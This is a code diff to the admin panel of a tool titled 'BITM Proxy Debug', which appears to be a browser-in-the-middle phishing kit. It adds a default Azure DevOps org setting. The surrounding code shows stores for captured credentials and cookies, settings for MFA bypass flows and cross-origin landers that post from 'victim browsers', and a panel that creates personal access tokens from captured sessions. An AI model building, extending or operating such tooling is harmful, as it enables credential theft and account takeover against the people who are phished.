@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.45.1")
+app = FastAPI(title="BITM Proxy Debug", version="1.46.0")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -6356,6 +6356,7 @@ function renderSlackConfig(){
 // stays visible without code changes.
 const CFG_SECTIONS=[
   {title:'Identity',keys:['auto_login_email']},
+  {title:'Azure / ADO defaults',keys:['default_tenant_id','default_ado_org']},
   {title:'Default device profile',keys:['default_device_id']},
   {title:'MFA',keys:['prefer_push','mfa_dead_end_show_qr','mfa_dead_end_device_code_enabled','mfa_dead_end_device_code_url']},
   {title:'Post-login redirect',keys:['post_login_redirect_enabled','post_login_redirect_url','post_login_redirect_playwright_enabled','post_login_redirect_playwright_url']},
@@ -6400,6 +6401,9 @@ function _cfgRowFor(k,v){
     const arr=Array.isArray(v)?v:[];
     const hint='Comma-separated origins (e.g. <code>https://lander.example.com, https://login-sso.example</code>) or <code>*</code> to allow any. Empty = no cross-origin POSTs (same-origin landers only). NOTE: cross-origin landers post from victim browsers, so <code>external_capture_allowed_ips</code> must also be broadened (often <code>0.0.0.0/0</code>).';
     row.innerHTML=`<label>${label}</label><input class="cfg-input cfg-input-wide" type="text" value="${esc(arr.join(', '))}" placeholder="same-origin only" onchange="cfgSet('${k}', this.value.split(',').map(s=>s.trim()).filter(Boolean))"><div style="color:#78859b;font-size:12px;margin-top:4px">${hint}</div>`;
+  }
+  else if(k==='default_ado_org'){
+    row.innerHTML=`<label>${label}</label><input class="cfg-input cfg-input-wide" type="text" value="${esc(v||'')}" placeholder="blank = auto-discover" onchange="cfgSet('${k}',this.value.trim())"><div style="color:#78859b;font-size:12px;margin-top:4px">Pre-fills the <b>ADO org</b> field on every Captured Data → ADO PAT panel. Leave blank to auto-discover the account's org(s) via the vssps accounts API.</div>`;
   }
   else if(typeof v==='boolean')row.innerHTML=`<label>${label}</label><label class="toggle"><input type="checkbox" ${v?'checked':''} onchange="cfgSet('${k}',this.checked)"><span class="sl"></span></label>`;
   else if(typeof v==='number')row.innerHTML=`<label>${label}</label><input class="cfg-input" type="number" value="${v}" onchange="cfgSet('${k}',Number(this.value))">`;
@@ -7777,7 +7781,7 @@ function renderAdoPatPanel(d,siteId){
         <label style="color:#94a3b8;font-size:13px;min-width:64px">Tenant</label>
         <input id="adopat-tid-${siteId}" class="cfg-input" style="flex:1;min-width:160px;font-size:13px" value="${esc(tid)}" placeholder="organizations, or a tenant GUID/domain">
         <label style="color:#94a3b8;font-size:13px;margin-left:6px">ADO org</label>
-        <input id="adopat-org-${siteId}" class="cfg-input" style="flex:1;min-width:160px;font-size:13px" placeholder="blank = auto-discover" title="Leave blank to discover the account's org(s) via the vssps accounts API and use the first">
+        <input id="adopat-org-${siteId}" class="cfg-input" style="flex:1;min-width:160px;font-size:13px" value="${esc((configCache.default_ado_org||'').trim())}" placeholder="blank = auto-discover" title="Leave blank to discover the account's org(s) via the vssps accounts API and use the first. Default comes from Settings → Azure / ADO defaults → default ado org.">
       </div>
       <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
         <label style="color:#94a3b8;font-size:13px;min-width:64px">PAT name</label>
